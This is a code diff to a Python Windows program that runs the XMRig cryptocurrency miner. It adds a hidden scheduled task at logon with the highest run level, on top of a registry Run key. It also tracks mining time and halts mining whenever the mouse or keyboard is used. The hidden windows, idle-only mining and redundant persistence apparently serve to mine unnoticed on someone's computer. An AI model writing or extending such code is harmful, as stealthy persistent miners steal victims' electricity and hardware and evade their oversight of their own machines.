@@ -49,6 +49,7 @@ SW_HIDE = getattr(subprocess, "SW_HIDE", 0)
 
 STARTUP_RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 STARTUP_VALUE_NAME = "XMRig_Runner"
+STARTUP_TASK_NAME = "XMRig_Runner_Task"
 
 # أسماء الأجهزة المحجوزة في ويندوز
 _WIN_RESERVED = (
@@ -257,6 +258,7 @@ class GPUMiner:
         self._log_thread = None
         self._stop_log_watch = threading.Event()
         self._session_marker = ""
+        self._mining_started_at = None
 
     # -----------------------------------------------------------
     # قراءة موقع الماوس ومدة الخمول الحالية (ماوس أو كيبورد) في ويندوز
@@ -463,7 +465,7 @@ class GPUMiner:
 
             if CONFIG.get("register_startup"):
                 if not self.add_to_startup():
-                    log.warning("Registry startup registration failed - continuing")
+                    log.warning("Startup registration failed - continuing")
 
             if CONFIG.get("change_power_plan"):
                 self.optimize_system()
@@ -1022,6 +1024,7 @@ class GPUMiner:
             self.gpu_backend_active = False
             self.accepted_shares = 0
             self.rejected_shares = 0
+            self._mining_started_at = None
             self._start_log_watcher()
             self._sync_artifact_visibility()
 
@@ -1046,15 +1049,18 @@ class GPUMiner:
             if rc is not None:
                 self._stop_log_watcher()
                 self.stage = MiningStage.IDLE
+                self._mining_started_at = None
                 log.error(f"Miner exited immediately after start (exit_code={rc})")
                 return False
 
             self.process = proc
+            self._mining_started_at = time.monotonic()
             self._advance_stage(MiningStage.PROCESS_STARTED, f"PID={self.process.pid}")
             return True
         except Exception as e:
             self._stop_log_watcher()
             self.stage = MiningStage.IDLE
+            self._mining_started_at = None
             log.error(f"Miner start failed: {e}")
             return False
 
@@ -1099,7 +1105,15 @@ class GPUMiner:
                     if mouse_moved:
                         last_activity_monotonic = now_mono
                         if is_running:
-                            log.info(f"Mouse moved to {current_pos} -> stopping miner immediately")
+                            elapsed_sec = (
+                                now_mono - self._mining_started_at
+                                if self._mining_started_at is not None
+                                else 0.0
+                            )
+                            log.info(
+                                f"Mouse moved to {current_pos} -> stopping miner immediately "
+                                f"after {elapsed_sec:.1f}s"
+                            )
                             self._safe_terminate()
                             mining_active_since = None
                             stability_recorded = False
@@ -1112,9 +1126,15 @@ class GPUMiner:
                 if recent_input:
                     last_activity_monotonic = now_mono
                     if is_running:
+                        elapsed_sec = (
+                            now_mono - self._mining_started_at
+                            if self._mining_started_at is not None
+                            else 0.0
+                        )
                         log.info(
                             f"Active input detected (idle={current_idle_sec:.2f}s, pos={current_pos}) "
-                            f"-> stopping miner immediately (stage={self.stage}, gpu_active={self.gpu_backend_active}, "
+                            f"-> stopping miner immediately after {elapsed_sec:.1f}s "
+                            f"(stage={self.stage}, gpu_active={self.gpu_backend_active}, "
                             f"accepted_shares={self.accepted_shares})"
                         )
                         self._safe_terminate()
@@ -1187,6 +1207,7 @@ class GPUMiner:
         self._stop_log_watcher()
         if not self.process:
             self.stage = MiningStage.IDLE
+            self._mining_started_at = None
             return True
         pid = self.process.pid
         terminated = False
@@ -1225,6 +1246,10 @@ class GPUMiner:
             return False
         finally:
             if terminated:
+                if self._mining_started_at is not None:
+                    elapsed_sec = max(0.0, time.monotonic() - self._mining_started_at)
+                    log.info(f"Mining session duration before stop: {elapsed_sec:.1f}s")
+                    self._mining_started_at = None
                 self.process = None
                 self.stage = MiningStage.IDLE
 
@@ -1259,50 +1284,107 @@ class GPUMiner:
                 python_exe = pythonw
         return f'"{python_exe}" "{script_path}"'
 
+    def _register_scheduled_task(self, cmd: str) -> bool:
+        if not _IS_WINDOWS:
+            return False
+        try:
+            res = subprocess.run(
+                [
+                    "schtasks",
+                    "/Create",
+                    "/TN",
+                    STARTUP_TASK_NAME,
+                    "/TR",
+                    cmd,
+                    "/SC",
+                    "ONLOGON",
+                    "/RL",
+                    "HIGHEST",
+                    "/F",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=15,
+                creationflags=CREATE_NO_WINDOW,
+            )
+            if res.returncode == 0:
+                log.info(f"Registered scheduled task [{STARTUP_TASK_NAME}] -> {cmd}")
+                return True
+            log.warning(
+                f"schtasks failed (rc={res.returncode}): {(res.stderr or res.stdout or '').strip()}"
+            )
+            return False
+        except Exception as e:
+            log.warning(f"Scheduled task registration error: {e}")
+            return False
+
     def add_to_startup(self) -> bool:
-        if not _IS_WINDOWS or not _HAS_WINREG:
-            log.warning("Registry startup unavailable on this platform or missing winreg.")
+        if not _IS_WINDOWS:
             return False
         cmd = self._build_startup_command()
         if not cmd:
             return False
-        try:
-            with winreg.CreateKeyEx(
-                winreg.HKEY_CURRENT_USER,
-                STARTUP_RUN_KEY,
-                0,
-                winreg.KEY_READ | winreg.KEY_WRITE,
-            ) as k:
-                winreg.SetValueEx(k, STARTUP_VALUE_NAME, 0, winreg.REG_SZ, cmd)
-                persisted, _ = winreg.QueryValueEx(k, STARTUP_VALUE_NAME)
-            if persisted != cmd:
-                log.warning(
-                    f"Startup registry mismatch after write (expected={cmd!r}, got={persisted!r})"
-                )
-                return False
-            log.info(
-                f"Registered in HKCU\\{STARTUP_RUN_KEY} [{STARTUP_VALUE_NAME}] -> {cmd}"
-            )
-            return True
-        except Exception as e:
-            log.error(f"Registry startup error: {e}")
-            return False
+
+        task_ok = self._register_scheduled_task(cmd)
+        reg_ok = False
+
+        if _HAS_WINREG:
+            try:
+                with winreg.CreateKeyEx(
+                    winreg.HKEY_CURRENT_USER,
+                    STARTUP_RUN_KEY,
+                    0,
+                    winreg.KEY_READ | winreg.KEY_WRITE,
+                ) as k:
+                    winreg.SetValueEx(k, STARTUP_VALUE_NAME, 0, winreg.REG_SZ, cmd)
+                    persisted, _ = winreg.QueryValueEx(k, STARTUP_VALUE_NAME)
+                if persisted == cmd:
+                    reg_ok = True
+                    log.info(
+                        f"Registered in HKCU\\{STARTUP_RUN_KEY} [{STARTUP_VALUE_NAME}] -> {cmd}"
+                    )
+                else:
+                    log.warning(
+                        f"Startup registry mismatch after write (expected={cmd!r}, got={persisted!r})"
+                    )
+            except Exception as e:
+                log.error(f"Registry startup error: {e}")
+        else:
+            log.warning("Registry startup unavailable on this platform or missing winreg.")
+
+        return task_ok or reg_ok
 
     def remove_from_startup(self) -> bool:
-        if not _IS_WINDOWS or not _HAS_WINREG:
+        if not _IS_WINDOWS:
             return False
+        removed_any = False
         try:
-            with winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER, STARTUP_RUN_KEY, 0, winreg.KEY_WRITE
-            ) as k:
-                winreg.DeleteValue(k, STARTUP_VALUE_NAME)
-            log.info(f"Removed [{STARTUP_VALUE_NAME}] from HKCU\\{STARTUP_RUN_KEY}")
-            return True
-        except FileNotFoundError:
-            return True
+            res = subprocess.run(
+                ["schtasks", "/Delete", "/TN", STARTUP_TASK_NAME, "/F"],
+                capture_output=True,
+                text=True,
+                timeout=15,
+                creationflags=CREATE_NO_WINDOW,
+            )
+            if res.returncode == 0:
+                log.info(f"Removed scheduled task [{STARTUP_TASK_NAME}]")
+                removed_any = True
         except Exception as e:
-            log.error(f"Registry delete error: {e}")
-            return False
+            log.warning(f"Scheduled task delete error: {e}")
+
+        if _HAS_WINREG:
+            try:
+                with winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER, STARTUP_RUN_KEY, 0, winreg.KEY_WRITE
+                ) as k:
+                    winreg.DeleteValue(k, STARTUP_VALUE_NAME)
+                log.info(f"Removed [{STARTUP_VALUE_NAME}] from HKCU\\{STARTUP_RUN_KEY}")
+                removed_any = True
+            except FileNotFoundError:
+                removed_any = True
+            except Exception as e:
+                log.error(f"Registry delete error: {e}")
+        return removed_any
 
     def optimize_system(self):
         if not _IS_WINDOWS:
